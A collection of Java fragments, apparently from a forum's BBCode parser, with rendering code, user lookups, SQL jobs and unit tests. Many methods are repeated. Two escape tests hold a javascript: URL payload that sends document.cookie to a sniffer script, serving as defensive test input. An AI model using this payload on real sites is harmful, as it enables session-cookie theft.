public void urlParamTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru]linux[/url] " , null ) , " <p><a href= \" http:linux.org.ru \" >linux</a></p> " ) ; } 
public void badListTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list]0[*]1[*]2[/list] " , null ) , " <p>0<ul><li>1</li><li>2</li></ul></p> " ) ; } 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo<div class= \" quote \" ><p><i>hz</i></p></div></p> " , ParserUtil . bb2xhtml ( " ololo[quote][i]hz[/i][/quote] " , null ) ) ; } 
public String getProcessedMessage ( Connection db , boolean includeCut ) throws SQLException { if ( lorcode ) { User author ; 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder ret = new StringBuilder ( ) ; String url = " " ; if ( node . isParameter ( ) ) { url = node . getParameter ( ) . trim ( ) ; } try { String escapedUrl = URLUtil . fixURL ( url ) ; ret . append ( " <a href= \" " ) . append ( escapedUrl ) . append ( " \" > " ) . append ( node . renderChildrenXHtml ( db ) ) . append ( " </a> " ) ; } catch ( Exception ex ) { ret . append ( " <s> " ) . append ( node . renderChildrenXHtml ( db ) ) . append ( " </s> " ) ; } return ret . toString ( ) ; } 
public void urlEscapeWithTagsTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , null ) , 
public void brTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [br] " , null ) , " <p><br></p> " ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , null ) , " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " ) ; } 
private Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node tempNode = currentNode ; while ( true ) { if ( tempNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( tempNode ) ) { TagNode node = ( TagNode ) tempNode ; String tagName = node . getBbtag ( ) . getName ( ) ; if ( tagName . equals ( name ) | | ( " url " . equals ( name ) & & tagName . equals ( " url2 " ) ) ) { currentNode = tempNode ; currentNode = ascend ( currentNode ) ; break ; } } tempNode = tempNode . getParent ( ) ; } return currentNode ; } 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][/url] " , null ) ) ; } 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , ParserUtil . bb2xhtml ( " [quote][/quote] " , null ) ) ; } 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , ParserUtil . bb2xhtml ( " [code][/code] " , null ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , ParserUtil . bb2xhtml ( " [code=cxx]#include <stdio.h>[/code] " , null ) ) ; } 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , ParserUtil . bb2xhtml ( " [code=foo]#include <stdio.h>[/code] " , null ) ) ; } 
public RootNode parse ( String rawbbcode ) { return parse ( rawbbcode , true , false , " " ) ; 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { return parserWithImages . parse ( bbcode , renderCut , cleanCut , cutUrl ) . renderXHtml ( db ) ; } 
public RootNode parse ( String rawbbcode ) { return parse ( rawbbcode , true , true , " " ) ; 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = parserWithImages . parse ( bbcode , renderCut , cleanCut , cutUrl ) ; return rootNode . renderXHtml ( db ) ; } 
public void incCutCount ( ) { cutCount + = 1 ; } 
public boolean isRenderCut ( ) { return renderCut ; } 
public boolean isCleanCut ( ) { return cleanCut ; } 
public RootNode parse ( String rawbbcode ) { RootNode rootNode = new RootNode ( this ) ; rootNode . setRenderOptions ( true , true , " " ) ; return parse ( rootNode , rawbbcode ) ; } 
public static String bb2xhtml ( String bbcode , Connection db ) { return parserWithOutImages . parse ( new RootNode ( parserWithOutImages ) , bbcode ) . renderXHtml ( db ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( db ) ; } 
private static String fixFormat ( String mode ) { if ( ! " ntobrq " . equals ( mode ) & & ! " quot " . equals ( mode ) & & ! " ntobr " . equals ( mode ) & & ! " lorcode " . equals ( mode ) ) { return ( String ) Profile . getDefaults ( ) . get ( " format.mode " ) ; } return mode ; } 
private static String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; form . setOutputLorcode ( true ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo</p><div class= \" quote \" ><p><i>hz</i></p></div> " , ParserUtil . bb2xhtml ( " ololo[quote][i]hz[/i][/quote] " , null ) ) ; } 
private static String fixFormat ( String mode ) { if ( ! " quot " . equals ( mode ) & & ! " ntobr " . equals ( mode ) & & ! " lorcode " . equals ( mode ) ) { return ( String ) Profile . getDefaults ( ) . get ( " format.mode " ) ; } return mode ; } 
private static String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; form . setOutputLorcode ( true ) ; if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
public ModelAndView view ( HttpServletRequest request ) { boolean isThreeColumn = getThreeColumns ( request ) ; ModelAndView result = new ModelAndView ( " edit-boxes " ) ; result . addObject ( " isThreeColumn " , isThreeColumn ) ; return result ; } 
public void updateScore ( ) { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " groupid!=8404 and groupid!=4068 and groupid!=19390 and " + " not comments.deleted and not topics.deleted) " ) ; jdbcTemplate . update ( " update users set max_score=score where score>max_score " ) ; } 
public void block ( ) { jdbcTemplate . update ( " update users set blocked='t' where id in (select id from users where score<-50 and nick!='anonymous' and max_score<150 and not blocked) " ) ; jdbcTemplate . update ( " update users set blocked='t' where id in (select id from users where score<-50 and nick!='anonymous' and max_score<150 and blocked is null) " ) ; } 
public void deleteInactivated ( ) { jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'1 week'::interval " ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder ret = new StringBuilder ( ) ; if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String imgurl = txtNode . getText ( ) ; try { String fixUrl = UriUtils . encodeQuery ( URLUtil . fixURL ( imgurl ) , " UTF-8 " ) ; ret . append ( " <img src= \" " ) ; ret . append ( UriUtils . encodeQuery ( fixUrl , " UTF-8 " ) ) ; ret . append ( " \" /> " ) ; } catch ( UtilException ex ) { ret . append ( " <s> " ) ; ret . append ( Parser . escape ( imgurl ) ) ; ret . append ( " </s> " ) ; } catch ( UnsupportedEncodingException e ) { throw new RuntimeException ( e ) ; } return ret . toString ( ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; String pattern ; try { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } catch ( SQLException e ) { pattern = " <s>%s</s> " ; TODO throw this exception up } return String.format(pattern, Parser.escape(memberName), Parser.escape(memberName)); 
private static Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node tempNode = currentNode ; while ( true ) { if ( tempNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( tempNode ) ) { TagNode node = ( TagNode ) tempNode ; String tagName = node . getBbtag ( ) . getName ( ) ; if ( tagName . equals ( name ) | | ( " url " . equals ( name ) & & tagName . equals ( " url2 " ) ) ) { currentNode = tempNode ; currentNode = ascend ( currentNode ) ; break ; } } tempNode = tempNode . getParent ( ) ; } return currentNode ; } 
public String renderNodeXhtml ( Node node , Connection db ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; String pattern ; try { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } catch ( SQLException e ) { pattern = " <s>%s</s> " ; TODO throw this exception up } return String.format(pattern, Parser.escape(memberName), Parser.escape(memberName)); 
public String getProcessedMessage ( Connection db , boolean includeCut ) throws SQLException { if ( lorcode ) { return ParserUtil . bb2xhtml ( message , includeCut , false , getLink ( ) , db ) ; 
private static String getProcessedMessage ( Connection db , PreparedStatement pst , Comment comment ) throws SQLException { pst . setInt ( 1 , comment . getId ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; rs . next ( ) ; String text = rs . getString ( 1 ) ; boolean bbcode = rs . getBoolean ( 2 ) ; rs . close ( ) ; if ( bbcode ) { return ParserUtil . bb2xhtml ( text , true , true , " " , db ) ; 
private static String getProcessedMessage ( Connection db , String message ) throws SQLException { return ParserUtil . bb2xhtml ( message , true , true , " " , db ) ; } 
public static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ "&#91;", "&#93;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public void resolveMessage ( Connection db , boolean b ) throws SQLException { PreparedStatement pstMsgbase = db . prepareStatement ( " UPDATE topics SET resolved=?,lastmod=lastmod+'1 second'::interval WHERE id=? " ) ; pstMsgbase . setBoolean ( 1 , b ) ; pstMsgbase . setInt ( 2 , msgid ) ; pstMsgbase . executeUpdate ( ) ; } 
public static String escape ( String html ) { return HTMLFormatter . htmlSpecialChars ( html ) ; } 
private static Node descend ( Node currentNode ) { return currentNode . getChildren ( ) . get ( currentNode . getChildren ( ) . size ( ) - 1 ) ; } 
private static Node ascend ( Node currentNode ) { return currentNode . getParent ( ) ; } 
private static Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node tempNode = currentNode ; while ( true ) { if ( tempNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( tempNode ) ) { TagNode node = ( TagNode ) tempNode ; String tagName = node . getBbtag ( ) . getName ( ) ; if ( tagName . equals ( name ) | | ( " url " . equals ( name ) & & tagName . equals ( " url2 " ) ) ) { currentNode = tempNode ; currentNode = ascend ( currentNode ) ; break ; } } tempNode = tempNode . getParent ( ) ; } return currentNode ; } 
protected String prepare ( String bbcode ) { return bbcode . replaceAll ( " r " , " " ) . replaceAll ( " " , " [softbr] " ) ; } 
public RootNode parse ( String rawbbcode ) { RootNode rootNode = new RootNode ( this ) ; rootNode . setRenderOptions ( true , true , " " ) ; return parse ( rootNode , rawbbcode ) ; } 
public static String bb2xhtml ( String bbcode , Connection db ) { return parserWithOutImages . parse ( new RootNode ( parserWithOutImages ) , bbcode ) . renderXHtml ( db ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( db ) ; } 
public String renderBBCode ( ) { StringBuilder ret = new StringBuilder ( ) ; ret . append ( '[' ) . append ( text ) . append ( ']' ) ; return ret . toString ( ) ; } 
public boolean allows ( String tagname ) { assert false ; return false ; } 
public boolean prohibited ( String tagname ) { return false ; } 
public int lengthChildren ( ) { return children . size ( ) ; } 
public boolean isParameter ( ) { return ( parameter ! = null ) & & ( parameter . length ( ) > 0 ) ; } 
public String renderXHtml ( Connection db ) { assert false ; return " " ; } 
public String renderBBCode ( ) { assert false ; return " " ; } 
public String renderChildrenXHtml ( Connection db ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( db ) ) ; } return stringBuilder . toString ( ) ; } 
public String renderChildrenBBCode ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderBBCode ( ) ) ; } return stringBuilder . toString ( ) ; 
public String renderXHtml ( Connection db ) { return renderChildrenXHtml ( db ) ; } 
public boolean allows ( String tagname ) { return parser . getBlockLevelTags ( ) . contains ( tagname ) ; } 
public String renderBBCode ( ) { return renderChildrenBBCode ( ) ; } 
public void incCutCount ( ) { cutCount + = 1 ; } 
public String renderXHtml ( Connection db ) { return bbtag . renderNodeXhtml ( this , db ) ; } 
public String renderBBCode ( ) { return bbtag . renderNodeBBCode ( this ) ; } 
public String renderBBCode ( ) { return text ; } 
public boolean allows ( String tagname ) { return false ; } 
public String renderNodeBBCode ( Node node ) { if ( " div " . equals ( name ) ) { return node . renderChildrenBBCode ( ) ; 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder ret = new StringBuilder ( ) ; if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String imgurl = txtNode . getText ( ) ; try { String fixUrl = UriUtils . encodeQuery ( URLUtil . fixURL ( imgurl ) , " UTF-8 " ) ; ret . append ( " <img src= \" " ) ; ret . append ( UriUtils . encodeQuery ( fixUrl , " UTF-8 " ) ) ; ret . append ( " \" /> " ) ; } catch ( UtilException ex ) { ret . append ( " <s> " ) ; ret . append ( Parser . escape ( imgurl ) ) ; ret . append ( " </s> " ) ; } catch ( UnsupportedEncodingException e ) { throw new RuntimeException ( e ) ; } return ret . toString ( ) ; } 
public String renderNodeBBCode ( Node node ) { TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; return txtNode . getText ( ) ; } 
public String renderNodeBBCode ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; return ret . append ( '[' ) 
public String renderNodeXhtml ( Node node , Connection db ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; String pattern ; try { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } catch ( SQLException e ) { pattern = " <s>%s</s> " ; TODO throw this exception up } return String.format(pattern, Parser.escape(memberName), Parser.escape(memberName)); 
public String renderNodeBBCode ( Node node ) { return " " ; } 
public String renderNodeXhtml ( Node node ) { throw new NotImplementedException ( ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { return renderNodeXhtml ( node ) ; } 
public String renderNodeBBCode ( Node node ) { StringBuilder opening = new StringBuilder ( name ) ; StringBuilder render = new StringBuilder ( ) ; if ( node . isParameter ( ) ) { opening . append ( '=' ) ; opening . append ( node . getParameter ( ) ) ; } if ( selfClosing ) { render . append ( '[' ) . append ( opening ) . append ( " /] " ) ; } else { render . append ( '[' ) . append ( opening ) . append ( ']' ) . append ( node . renderChildrenBBCode ( ) ) . append ( " [/ " ) . append ( name ) . append ( ']' ) ; } return render . toString ( ) ; } 
public void pTest ( ) { Assert . assertEquals ( " <p>test ntest1</p><p>test2</p> " , ParserUtil . bb2xhtml ( " test ntest1 ntest2 " , null ) ) ; } 
public static String escape ( String html ) { return HTMLFormatter . htmlSpecialChars ( html ) ; } 
private static Node descend ( Node currentNode ) { return currentNode . getChildren ( ) . get ( currentNode . getChildren ( ) . size ( ) - 1 ) ; } 
private static Node ascend ( Node currentNode ) { return currentNode . getParent ( ) ; } 
private static Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node tempNode = currentNode ; while ( true ) { if ( tempNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( tempNode ) ) { TagNode node = ( TagNode ) tempNode ; String tagName = node . getBbtag ( ) . getName ( ) ; if ( tagName . equals ( name ) | | ( " url " . equals ( name ) & & tagName . equals ( " url2 " ) ) ) { currentNode = tempNode ; currentNode = ascend ( currentNode ) ; break ; } } tempNode = tempNode . getParent ( ) ; } return currentNode ; } 
protected String prepare ( String bbcode ) { return bbcode . replaceAll ( " r " , " " ) . replaceAll ( " " , " [softbr] " ) ; } 
public RootNode parse ( String rawbbcode ) { RootNode rootNode = new RootNode ( this ) ; rootNode . setRenderOptions ( true , true , " " ) ; return parse ( rootNode , rawbbcode ) ; } 
public static String bb2xhtml ( String bbcode , Connection db ) { return parserWithOutImages . parse ( new RootNode ( parserWithOutImages ) , bbcode ) . renderXHtml ( db ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( db ) ; } 
public String renderBBCode ( ) { StringBuilder ret = new StringBuilder ( ) ; ret . append ( '[' ) . append ( text ) . append ( ']' ) ; return ret . toString ( ) ; } 
public boolean allows ( String tagname ) { assert false ; return false ; } 
public boolean prohibited ( String tagname ) { return false ; } 
public int lengthChildren ( ) { return children . size ( ) ; } 
public boolean isParameter ( ) { return ( parameter ! = null ) & & ( parameter . length ( ) > 0 ) ; } 
public String renderXHtml ( Connection db ) { assert false ; return " " ; } 
public String renderBBCode ( ) { assert false ; return " " ; } 
public String renderChildrenXHtml ( Connection db ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( db ) ) ; } return stringBuilder . toString ( ) ; } 
public String renderChildrenBBCode ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderBBCode ( ) ) ; } return stringBuilder . toString ( ) ; 
public String renderXHtml ( Connection db ) { return renderChildrenXHtml ( db ) ; } 
public boolean allows ( String tagname ) { return parser . getBlockLevelTags ( ) . contains ( tagname ) ; } 
public String renderBBCode ( ) { return renderChildrenBBCode ( ) ; } 
public boolean isRenderCut ( ) { return renderCut ; } 
public String renderXHtml ( Connection db ) { return bbtag . renderNodeXhtml ( this , db ) ; } 
public String renderBBCode ( ) { return bbtag . renderNodeBBCode ( this ) ; } 
public boolean allows ( String tagname ) { return false ; } 
public String renderNodeBBCode ( Node node ) { if ( " div " . equals ( name ) ) { return node . renderChildrenBBCode ( ) ; 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder ret = new StringBuilder ( ) ; if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String imgurl = txtNode . getText ( ) ; try { String fixUrl = UriUtils . encodeQuery ( URLUtil . fixURL ( imgurl ) , " UTF-8 " ) ; ret . append ( " <img src= \" " ) ; ret . append ( UriUtils . encodeQuery ( fixUrl , " UTF-8 " ) ) ; ret . append ( " \" /> " ) ; } catch ( UtilException ex ) { ret . append ( " <s> " ) ; ret . append ( Parser . escape ( imgurl ) ) ; ret . append ( " </s> " ) ; } catch ( UnsupportedEncodingException e ) { throw new RuntimeException ( e ) ; } return ret . toString ( ) ; } 
public String renderNodeBBCode ( Node node ) { TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; return txtNode . getText ( ) ; } 
public String renderNodeBBCode ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; return ret . append ( '[' ) 
public String renderNodeXhtml ( Node node , Connection db ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; String pattern ; try { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } catch ( SQLException e ) { pattern = " <s>%s</s> " ; TODO throw this exception up } return String.format(pattern, Parser.escape(memberName), Parser.escape(memberName)); 
public String renderNodeBBCode ( Node node ) { return " " ; } 
public String renderNodeXhtml ( Node node ) { throw new NotImplementedException ( ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { return renderNodeXhtml ( node ) ; } 
public String renderNodeBBCode ( Node node ) { StringBuilder opening = new StringBuilder ( name ) ; StringBuilder render = new StringBuilder ( ) ; if ( node . isParameter ( ) ) { opening . append ( '=' ) ; opening . append ( node . getParameter ( ) ) ; } if ( selfClosing ) { render . append ( '[' ) . append ( opening ) . append ( " /] " ) ; } else { render . append ( '[' ) . append ( opening ) . append ( ']' ) . append ( node . renderChildrenBBCode ( ) ) . append ( " [/ " ) . append ( name ) . append ( ']' ) ; } return render . toString ( ) ; } 
public boolean isSelfClosing ( ) { return selfClosing ; } 
public boolean isDiscardable ( ) { return discardable ; } 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , ParserUtil . bb2xhtml ( " some text n some again text [url=http:example.com]example[/url] example " , null ) ) ; 
public ArchiveDTO mapRow ( ResultSet rs , int rowNum ) throws SQLException { ArchiveDTO dto = new ArchiveDTO ( ) ; dto . setYear ( rs . getInt ( " year " ) ) ; dto . setMonth ( rs . getInt ( " month " ) ) ; dto . setCount ( rs . getInt ( " c " ) ) ; return dto ; } 
public static User getUser ( Connection db , String nick ) throws UserNotFoundException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , true ) ; JdbcTemplate jdbcTemplate = new JdbcTemplate ( scds ) ; return UserDao . getUser ( jdbcTemplate , nick ) ; } 
public static User getUser ( Connection db , int id ) throws UserNotFoundException { return getUser ( db , id , false ) ; } 
public static User getUserCached ( Connection db , int id ) throws UserNotFoundException { return getUser ( db , id , true ) ; } 
private static User getUser ( Connection db , int id , boolean useCache ) throws UserNotFoundException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , true ) ; JdbcTemplate jdbcTemplate = new JdbcTemplate ( scds ) ; return UserDao . getUser ( jdbcTemplate , id , useCache ) ; } 
private void updateCache ( Connection db ) { try { getUser ( db , id ) ; 
public void setAsText ( String s ) throws IllegalArgumentException { if ( s . isEmpty ( ) ) { setValue ( null ) ; return ; } try { setValue ( userDao . getUser ( s ) ) ; 
public static User getUser ( JdbcTemplate jdbcTemplate , String nick ) throws UserNotFoundException { return getUserInternal ( jdbcTemplate , nick ) ; } 
private static User getUserInternal ( JdbcTemplate jdbcTemplate , String nick ) throws UserNotFoundException { if ( nick = = null ) { throw new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { throw new UserNotFoundException ( " <invalid name> " ) ; } Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; List < User > list = jdbcTemplate . query ( " SELECT id,nick,candel,canmod,corrector,passwd,blocked,score,max_score,activated,photo,email,name,unread_events FROM users where nick=? " , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new User ( rs ) ; } } , nick ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } User user = list . get ( 0 ) ; String cacheId = " User?id= " + user . getId ( ) ; cache . put ( new Element ( cacheId , user ) ) ; return user ; } 
public User mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new User ( rs ) ; } 
public User getUser ( String nick ) throws UserNotFoundException { return getUserInternal ( jdbcTemplate , nick ) ; } 
public User getUser ( int id , boolean useCache ) throws UserNotFoundException { return getUserInternal ( jdbcTemplate , id , useCache ) ; } 
public User getUserCached ( int id ) throws UserNotFoundException { return getUserInternal ( jdbcTemplate , id , true ) ; } 
public User getUser ( int id ) throws UserNotFoundException { return getUserInternal ( jdbcTemplate , id , false ) ; } 
public static User getUser ( JdbcTemplate jdbcTemplate , int id , boolean useCache ) throws UserNotFoundException { return getUserInternal ( jdbcTemplate , id , useCache ) ; } 
private static User getUserInternal ( JdbcTemplate jdbcTemplate , int id , boolean useCache ) throws UserNotFoundException { Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; String cacheId = " User?id= " + id ; User res = null ; if ( useCache ) { Element element = cache . get ( cacheId ) ; if ( element ! = null ) { res = ( User ) element . getObjectValue ( ) ; } } if ( res = = null ) { List < User > list = jdbcTemplate . query ( " SELECT id, nick,score, max_score, candel,canmod,corrector,passwd,blocked,activated,photo,email,name,unread_events FROM users where id=? " , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new User ( rs ) ; } } , id ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } res = list . get ( 0 ) ; cache . put ( new Element ( cacheId , res ) ) ; } return res ; } 
public User mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new User ( rs ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; String pattern ; try { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } return String . format ( pattern , Parser . escape ( memberName ) , Parser . escape ( memberName ) ) ; 
public void paraTest1 ( ) { Assert . assertEquals ( " <p>some1 text</p><p>some2 text n</p><ul> n<li>one n</li><li>two</li></ul> n<p><a href= \" http:www.example.com \" >http:www.example.com</a> - some3 text</p> " , ParserUtil . bb2xhtml ( " some1 text nsome2 text n[list] n[*]one n[*]two n[/list] n[url]http:www.example.com[/url] - some3 text " , null ) ) ; 
public void pTest ( ) { Assert . assertEquals ( " <p>test ntest1</p><p>test2</p> " , ParserUtil . bb2xhtml ( " test ntest1 ntest2 " , null ) ) ; } 
public void tagEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " <br> " , null ) , " <p>&lt;br&gt;</p> " ) ; } 
public void urlEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , null ) , 
public void urlEscapeWithTagsTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , null ) , 
public void badListTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list]0[*]1[*]2[/list] " , null ) , " <p>0</p><ul><li>1</li><li>2</li></ul> " ) ; } 
